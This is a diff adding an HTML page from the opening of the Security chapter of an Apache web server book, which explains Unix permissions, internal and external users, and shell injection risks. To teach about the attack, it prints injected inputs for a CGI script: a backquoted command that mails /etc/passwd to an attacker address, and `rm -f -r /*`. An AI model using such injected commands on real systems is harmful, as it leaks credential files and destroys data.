@@ -1,0 +1,651 @@
+<?label 13. Security?><html><head><title>Security (Apache: The Definitive Guide)</title><link href="../style/style1.css" type="text/css" rel="stylesheet" />
+
+<meta name="DC.Creator" content="Ben Laurie and Peter Laurie" /><meta scheme="MIME" content="text/xml" name="DC.Format" /><meta content="en-US" name="DC.Language" /><meta content="O'Reilly & Associates, Inc." name="DC.Publisher" /><meta scheme="ISBN" name="DC.Source" content="1565925289L" /><meta name="DC.Subject.Keyword" content="stuff" /><meta name="DC.Title" content="Apache: The Definitive Guide" /><meta content="Text.Monograph" name="DC.Type" />
+
+</head><body bgcolor="#ffffff">
+
+<img src="gifs/smbanner.gif" alt="Book Home" usemap="#banner-map" border="0" /><map name="banner-map"><area alt="Apache: The Definitive Guide" href="index.htm" coords="0,0,466,65" shape="rect" /><area alt="Search this book" href="jobjects/fsearch.htm" coords="467,0,514,18" shape="rect" /></map>
+
+<div class="navbar"><table border="0" width="515"><tr><td width="172" valign="top" align="left"><a href="ch12_12.htm"><img src="../gifs/txtpreva.gif" alt="Previous" border="0" /></a></td><td width="171" valign="top" align="center"><a href="index.htm">Apache: The Definitive Guide</a></td><td width="172" valign="top" align="right"><a href="ch13_02.htm"><img src="../gifs/txtnexta.gif" alt="Next" border="0" /></a></td></tr></table></div>
+<hr align="left" width="515" />
+
+
+
+<h1 class="chapter">Chapter 13. Security</h1>
+<div class="htmltoc"><h4 class="tochead">Contents:</h4><p>
+<a href="ch13_01.htm">Internal and External Users</a><br />
+<a href="ch13_02.htm">Apache's Security Precautions</a><br />
+<a href="ch13_03.htm">Binary Signatures, Virtual Cash</a><br />
+<a href="ch13_04.htm">Firewalls</a><br />
+<a href="ch13_05.htm">Legal Issues</a><br />
+<a href="ch13_06.htm">Secure Sockets Layer: How to Do It</a><br />
+<a href="ch13_07.htm">Apache-SSL's Directives</a><br />
+<a href="ch13_08.htm">Cipher Suites</a><br />
+<a href="ch13_09.htm">SSL and CGI</a><br /></p></div>
+
+
+
+
+
+
+
+
+
+<p>
+<a name="INDEX-1080" />
+<a name="INDEX-1081" />
+<a name="INDEX-1082" />The
+operation of a web server raises several security issues. Here we
+look at them in general terms; later on, we will discuss the
+necessary code in detail.</p>
+
+
+
+
+
+<p>We are no more anxious to have unauthorized people in our computer
+than to have unauthorized people in our house. In the ordinary way, a
+desktop PC is pretty secure. An intruder would have to get physically
+into your house or office to get at the information in it or to
+damage it. However, once you connect a telephone line, it's as
+if you moved your house to a street with 30 million close neighbors
+(not all of them desirable), tore your front door off its hinges, and
+went out leaving the lights on and your children in bed.</p>
+
+
+
+
+
+<p>A complete discussion of computer security would fill a library.
+However, the meat of the business is as follows. We want to make it
+impossible for strangers to copy, alter, or erase any of our data
+files. We want to prevent strangers from running any unapproved
+programs on our machine. Just as important, we want to prevent our
+friends and legitimate users from making silly mistakes that may have
+consequences as serious as deliberate vandalism. For instance, they
+can execute the command:</p>
+
+
+
+
+
+<blockquote><pre class="code">rm -f -r *</pre></blockquote>
+
+
+
+
+
+<p>and delete all their own files and subdirectories, but they
+won't be able to execute this dramatic action in anyone
+else's area. One hopes no one would be as silly as that, but
+subtler mistakes can be as damaging.</p>
+
+
+
+
+
+<p>As far as the system designer is concerned, there is not a lot of
+difference between villainy and willful ignorance. Both must be
+guarded against.</p>
+
+
+
+
+
+<p>We look at basic security as it applies to a system with a number of
+terminals that might range from 2 to 10,000, and then see how it can
+be applied to a web server. We assume that a serious operating system
+such as Unix is running.</p>
+
+
+
+
+
+<p><img src="figs/win32_icon.gif" alt="Figure 13" />   We do not include Win32 in this chapter, even though Apache now runs
+on it, because it is our opinion that if you care about security you
+should not be using Win32. That is not to say that Win32 has no
+security, but it is poorly documented, understood by very few people,
+and constantly undermined by bugs and dubious practices (such as
+advocating ActiveX downloads from the Web).</p>
+
+
+
+
+
+<p>The basic idea of standard Unix security is that every operation on
+the computer is commanded by a known person who can be held
+responsible for his or her actions. Everyone using the computer has
+to log in so the computer knows who he or she is. Users identify
+themselves with unique passwords that are checked against a security
+database maintained by the administrator. On entry, each person is
+assigned to a group of people with similar security privileges; on a
+properly secure system, every action the user makes is logged. Every
+program and every data file on the machine also belongs to a security
+group. The effect of the security system is that a user can run only
+a program available to his or her security group, and that program
+can access only files that are also available to the user's
+group.</p>
+
+
+
+
+
+<p>In this way, we can keep the accounts people from fooling with
+engineering drawings, and the salespeople are unable to get into the
+accounts area to massage their approved expense claims.</p>
+
+
+
+
+
+<p>Of course, there has to be someone with the authority to go
+everywhere and alter everything; otherwise, the system would never
+get set up in the first place. This person is the superuser, who logs
+in as <em class="emphasis">root</em> using the top-secret password
+pencilled on the wall over the system console. He is essential, but
+because of his awesome powers, he is a very worrying person to have
+around. If an enemy agent successfully impersonates your head of
+security, you are in real trouble.</p>
+
+
+
+
+
+<p>And, of course, this is exactly the aim of the wolf: to get himself
+into the machine with superuser's privileges so that he can run
+any program. Failing that, he wants at least to get in with
+privileges higher than those to which he is entitled. If he can do
+that, he can potentially delete data, read files he shouldn't,
+and collect passwords to other, more valuable, systems. Our object is
+to see that he doesn't.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="sect1"><a name="ch13-1-fm2xml" />
+<h2 class="sect1">13.1. Internal and External Users</h2>
+
+
+
+
+
+<p>
+<a name="INDEX-1083" /> <a name="INDEX-1084" />
+<a name="INDEX-1085" />As we have said, most serious operating
+systems, including Unix, provide security by limiting the ability of
+each user to perform certain operations. The exact details are
+unimportant, but when we apply this principle to a web server, we
+clearly have to decide who the users of the web server are with
+respect to the security of our network sheltering behind it. When
+considering a web server's security, we must recognize that
+there are essentially two kinds of users: internal and external.</p>
+
+
+
+
+
+<p>The internal users are those within the organization that owns the
+server (or, at least, the users the owners intend to be able to
+update server content); the external ones inhabit the rest of the
+Internet. Of course, there are many levels of granularity below this
+one, but here we are trying to capture the difference between users
+who are supposed to use the HTTP server only to browse pages (the
+external users), and users who may be permitted greater access to the
+web server (the internal users).</p>
+
+
+
+
+
+<p>We need to consider security for both of these groups, but the
+external users are more worrying and have to be more strictly
+controlled. It is not that the internal users are necessarily nicer
+people or less likely to get up to mischief. In some ways, they are
+more likely to create trouble, having motive and knowledge, but, to
+put it bluntly, we know (mostly) who signs their paychecks. The
+external users are usually beyond our vengeance.</p>
+
+
+
+
+
+<p>In essence, by connecting to the Internet, we allow anyone in the
+world to type anything they like on our server's keyboard. This
+is an alarming thought: we want to allow them to do a very small
+range of safe things and to make sure that they cannot do anything
+outside that range. This desire has a couple of implications:</p>
+
+
+
+
+
+<ul><li><p>External users should only be able to access those files and programs
+we have specified and no others.</p></li><li><p>The server should not be vulnerable to sneaky attacks, like asking
+for a page with a one-megabyte name (the Bad Guy hopes that a name
+that long might overrun a fixed-length buffer and trash the stack) or
+with funny characters (like "!," "#," or
+"/") included in the page name that might cause part of
+it to be construed as a command by the server's operating
+system, and so on. These scenarios can be avoided only by careful
+programming. Apache's approach to the first problem is to avoid
+using fixed-size buffers for anything but fixed-size data;<a href="#FOOTNOTE-58">[58]</a> it sounds simple, but really it costs a lot of
+painstaking work. The other problems are dealt with case by case,
+sometimes after a security breach has been identified, but most often
+just by careful thought on the part of Apache's coders.</p><blockquote>
+
+
+
+
+<a name="FOOTNOTE-58" /><p>[58]Buffer overruns are far and away the most common cause of
+security holes on the Internet, not just on web servers.</p>
+
+
+
+
+</blockquote></li></ul>
+<p>Unfortunately, Unix works against us. First, the standard HTTP port
+is 80. Only the superuser can attach to this port (this is a
+misguided historical attempt at security), so the server must at
+least start up as the superuser: this is exactly what we do not
+want.<a href="#FOOTNOTE-59">[59]</a></p><blockquote>
+
+
+
+
+<a name="FOOTNOTE-59" /><p>[59]This is a rare case in which Win32 is actually
+better than Unix. We are not required to be superuser on Win32,
+though we do have to have permission to start services.</p>
+
+
+
+
+</blockquote>
+
+
+
+
+
+<p>Another problem is that the various shells used by Unix have a rich
+syntax, full of clever tricks that the Bad Guy may be able to exploit
+to do things we do not expect or like. Win32 is by no means immune to
+these problems either, as the only shell it provides
+(<em class="emphasis">COMMAND.COM</em> ) is so lacking in power that Unix
+shells are almost invariably used in its place.</p>
+
+
+
+
+
+<p>For example, we might have sent a form to the user in HTML script.
+His computer interprets the script and puts the form up on his
+screen. He fills in the form and hits the Submit button. His machine
+then sends it back to our server, where it invokes a URL with the
+contents of the form tacked on the end. We have set up our server so
+that this URL runs a script that appends the contents of the form to
+a file we can look at later. Part of the script might be the
+following line:</p>
+
+
+
+
+
+<blockquote><pre class="code">echo "You have sent the following message: $MESSAGE"</pre></blockquote>
+
+
+
+
+
+<p>The intention is that our machine should return a confirmatory
+message to the user, quoting whatever he said to us in the text
+string <tt class="literal">$MESSAGE</tt>.</p>
+
+
+
+
+
+<p>Now, if the external user is a cunning and bad person, he may send us
+the <tt class="literal">$MESSAGE</tt>:</p>
+
+
+
+
+
+<blockquote><pre class="code">`mail wolf@lair.com &lt; /etc/passwd`</pre></blockquote>
+
+
+
+
+
+<p>Since backquotes are interpreted by the shell as enclosing commands,
+this has the alarming effect of sending our top-secret password file
+to this complete stranger. Or, with less imagination but equal
+malice, he might simply have sent us:</p>
+
+
+
+
+
+<blockquote><pre class="code">`rm -f -r /*`</pre></blockquote>
+
+
+
+
+
+<p>which amusingly licks our hard disk as clean as a wolf 's
+dinner plate.<a name="INDEX-1086" /> <a name="INDEX-1087" /> <a name="INDEX-1088" /></p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<hr align="left" width="515" />
+<div class="navbar"><table border="0" width="515"><tr><td width="172" valign="top" align="left"><a href="ch12_12.htm"><img src="../gifs/txtpreva.gif" alt="Previous" border="0" /></a></td><td width="171" valign="top" align="center"><a href="index.htm"><img src="../gifs/txthome.gif" alt="Home" border="0" /></a></td><td width="172" valign="top" align="right"><a href="ch13_02.htm"><img src="../gifs/txtnexta.gif" alt="Next" border="0" /></a></td></tr><tr><td width="172" valign="top" align="left">12.12. DSO</td><td width="171" valign="top" align="center"><a href="index/index.htm"><img src="../gifs/index.gif" alt="Book Index" border="0" /></a></td><td width="172" valign="top" align="right">13.2. Apache's Security Precautions</td></tr></table></div>
+<hr align="left" width="515" />
+
+<img src="../gifs/navbar.gif" alt="Library Navigation Links" usemap="#library-map" border="0" />
+<p><font size="-1"><a href="copyrght.htm">Copyright &copy; 2001</a> O'Reilly &amp; Associates. All rights reserved.</font></p>
+
+<map name="library-map"><area href="../index.htm" coords="1,1,83,102" shape="rect" /><area href="../lnut/index.htm" coords="81,0,152,95" shape="rect" /><area href="../run/index.htm" coords="172,2,252,105" shape="rect" /><area href="../apache/index.htm" coords="238,2,334,95" shape="rect" /><area href="../sql/index.htm" coords="336,0,412,104" shape="rect" /><area href="../dbi/index.htm" coords="415,0,507,101" shape="rect" /><area href="../cgi/index.htm" coords="511,0,601,99" shape="rect" /></map>
+
+</body></html>
